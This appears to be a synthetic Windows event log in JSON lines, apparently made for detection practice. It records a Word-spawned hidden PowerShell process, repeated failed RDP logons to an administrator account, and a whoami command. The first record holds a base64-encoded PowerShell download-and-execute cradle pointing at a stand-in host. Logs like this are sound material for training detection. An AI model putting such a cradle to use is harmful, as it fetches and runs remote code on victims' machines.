{"EventID":1,"UtcTime":"2026-02-26T18:10:00Z","Computer":"WIN10-LAB","User":"WIN10-LAB\\sean","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AdABsAGQAJwApAA==","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
{"EventID":3,"UtcTime":"2026-02-26T18:10:05Z","Computer":"WIN10-LAB","User":"WIN10-LAB\\sean","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -NoP -W Hidden -Enc ...","SourceIp":"10.0.0.15","DestinationIp":"10.0.0.9","DestinationPort":445,"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}
{"EventID":4625,"UtcTime":"2026-02-26T18:11:10Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":4625,"UtcTime":"2026-02-26T18:11:20Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":4625,"UtcTime":"2026-02-26T18:11:30Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":4625,"UtcTime":"2026-02-26T18:11:40Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":4625,"UtcTime":"2026-02-26T18:11:50Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":4625,"UtcTime":"2026-02-26T18:12:00Z","Computer":"DC01","TargetUserName":"administrator","IpAddress":"203.0.113.50","DestinationPort":3389}
{"EventID":1,"UtcTime":"2026-02-26T18:13:00Z","Computer":"WIN10-LAB","User":"WIN10-LAB\\sean","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentImage":"C:\\Windows\\explorer.exe"}
{"EventID":3,"UtcTime":"2026-02-26T18:14:00Z","Computer":"WIN10-LAB","User":"WIN10-LAB\\sean","Image":"C:\\Windows\\System32\\svchost.exe","CommandLine":"","SourceIp":"10.0.0.15","DestinationIp":"1.1.1.1","DestinationPort":53,"ParentImage":"C:\\Windows\\System32\\services.exe"}
